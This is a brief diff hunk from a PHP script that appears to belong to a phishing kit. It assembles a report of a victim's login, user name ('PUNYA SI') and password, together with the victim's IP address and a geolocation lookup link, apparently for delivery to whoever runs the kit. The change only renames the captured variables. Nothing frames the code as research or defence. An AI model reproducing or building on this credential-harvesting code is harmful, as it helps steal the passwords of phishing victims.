@@ -62,8 +62,8 @@ $msg = ("
 
 
 [Login] = ".$login."
-PUNYA SI  = ".$email."
-PASSWORD  = ".$password."
+PUNYA SI  = ".$user."
+PASSWORD  = ".$pass."
 
 [+]============System============[+]
 [IP INFO] = http://www.geoiptool.com/?IP=".$IP."
